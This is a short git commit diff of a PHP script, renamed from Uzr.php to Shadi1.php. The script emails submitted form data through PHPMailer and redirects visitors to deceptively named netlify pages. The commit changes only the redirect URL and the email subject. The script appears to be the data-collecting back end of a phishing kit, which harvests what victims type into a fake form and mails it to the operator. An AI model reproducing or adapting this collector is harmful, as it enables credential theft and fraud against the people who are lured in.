4dc57e6b33ffced027bf8f6c9d645f71e633a7d3
Uzr44911 <ahmjtalijaan@gmail.com>
2025-08-08 04:38:41 +0500

    Update and rename Uzr.php to Shadi1.php

--- Shadi1.php
+++ Shadi1.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://sure-submit-soctry-info.netlify.app/");
+header("Location: https://get-team-open-now.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -45,7 +45,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'uzr';
+        $mail->Subject = 'shadi1';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
